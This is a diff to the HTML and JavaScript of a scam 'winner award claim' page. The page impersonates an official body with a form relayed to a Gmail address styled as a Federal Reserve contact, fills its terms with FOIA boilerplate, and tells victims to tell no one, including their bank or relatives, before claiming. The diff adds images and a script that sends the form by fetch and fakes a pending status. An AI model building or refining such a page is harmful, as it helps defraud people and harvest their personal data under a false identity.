@@ -50,6 +50,7 @@
 
     <section class="card">
       <h2 style="margin-top:0;">Terms and Conditions</h2>
+      <img src="logo1.png.png" alt="Logo" style="display:block;max-width:180px;margin:12px auto;border-radius:12px;" />
       <p class="note">We are pleased to inform you that we are now offering the convenience of receiving your payments directly to your account. To facilitate this process, we kindly request that you promptly complete the deposit form provided on our website. In addition to filling out the deposit form, we would like to emphasize the critical importance of complying with the Freedom of Information Act (FOIA) regulations and securely retaining your information. By ensuring the accurate and timely completion of the deposit form, you are not only streamlining the payment process but also aiding us in meeting FOIA requirements and safeguarding your data.</p>
       <p class="note">This is strictly a surprise! To avoid disqualification, winners are not allowed to notify any third party, individual, bank attendant, relatives, or visitors until your prize is safely awarded to your home address. This information is provided to protect each winner from doubt, confusion, or hesitation toward claiming their prize. Only winners can and should have access to this claim document.</p>
       <label class="option" style="margin-top:10px;"><input type="checkbox" id="confirmTerms" /> I confirm that I have read and accept these terms.</label>
@@ -57,7 +58,7 @@
 
     <section class="card">
       <h2 style="margin-top:0;">Claim Form</h2>
-      <form action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST">
+      <form id="winnerClaimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST">
         <input type="hidden" name="_subject" value="New Winner Award Claim" />
         <input type="hidden" name="_captcha" value="false" />
         <input type="hidden" name="_template" value="table" />
@@ -84,6 +85,7 @@
 
         <section class="card" style="margin-top:16px;">
           <h3 style="margin-top:0;">Terms and Conditions</h3>
+          <img src="FAOI.png" alt="FOIA" style="display:block;max-width:220px;margin:12px auto;border-radius:12px;" />
           <p class="note">The Freedom of Information Act (FOIA) provides the ASP Escrow Officer with the right to request access to individual records or information except to the extent that the records are protected from disclosure by any of the nine exemptions contained in the law or by one of three special law enforcement record exclusions. We destroy the information we collect when the purpose for which it was provided has been fulfilled unless we are required to keep it longer by statute or official policy. Electronically submitted information is maintained and destroyed according to the principles of the Federal Records Act and the regulations and records schedules approved by the National Archives and Records Administration. In some cases, information submitted to us may become an agency record and therefore might be subject to a Freedom of Information Act request.</p>
           <p class="note">We prioritize the privacy and security of your information and assure you that all data provided will be handled with the utmost confidentiality. By proactively completing the deposit form and familiarizing yourself with our information retention policies, you can trust that your payments will be processed smoothly and securely.</p>
           <label class="option" style="margin-top:10px;"><input type="checkbox" name="agree" required /> I agree to the terms and conditions.</label>
@@ -96,10 +98,66 @@
         </section>
 
         <button class="btn btn-danger" type="submit" style="margin-top:16px;">Submit Claim</button>
+        <p id="claimSubmitMessage" class="note" style="display:none;margin-top:12px;"></p>
       </form>
     </section>
 
     <p class="footer"><a href="index.html" class="btn" style="margin-top:10px;">Back to Home</a></p>
   </main>
+  <script>
+    const winnerClaimForm = document.getElementById('winnerClaimForm');
+    const claimSubmitMessage = document.getElementById('claimSubmitMessage');
+
+    function savePendingClaim(name) {
+      if (!name) return;
+      const storageKey = 'pendingWinnerClaims';
+      try {
+        const pending = JSON.parse(localStorage.getItem(storageKey) || '[]');
+        const normalized = name.trim().toLowerCase();
+        if (!pending.includes(normalized)) {
+          pending.push(normalized);
+          localStorage.setItem(storageKey, JSON.stringify(pending));
+        }
+      } catch (err) {
+        localStorage.setItem(storageKey, JSON.stringify([name.trim().toLowerCase()]));
+      }
+    }
+
+    if (winnerClaimForm) {
+      winnerClaimForm.addEventListener('submit', function (event) {
+        event.preventDefault();
+        const formData = new FormData(winnerClaimForm);
+        const firstName = formData.get('firstName') || '';
+        const lastName = formData.get('lastName') || '';
+        const fullName = `${firstName} ${lastName}`.trim();
+        savePendingClaim(fullName);
+
+        const submitButton = winnerClaimForm.querySelector('button[type="submit"]');
+        if (submitButton) submitButton.disabled = true;
+
+        fetch(winnerClaimForm.action, {
+          method: winnerClaimForm.method,
+          body: formData
+        }).then(response => {
+          if (response.ok) {
+            claimSubmitMessage.textContent = 'Claim submitted. Your status is now pending and you will be redirected to the winners list.';
+            claimSubmitMessage.style.display = 'block';
+            claimSubmitMessage.style.color = '#134e8a';
+            setTimeout(() => {
+              window.location.href = 'index.html#winners';
+            }, 1400);
+          } else {
+            throw new Error('submit failed');
+          }
+        }).catch(() => {
+          claimSubmitMessage.textContent = 'Your claim was saved locally as pending, but there was a problem sending the form. Please try again.';
+          claimSubmitMessage.style.display = 'block';
+          claimSubmitMessage.style.color = '#b00020';
+        }).finally(() => {
+          if (submitButton) submitButton.disabled = false;
+        });
+      });
+    }
+  </script>
 </body>
 </html>
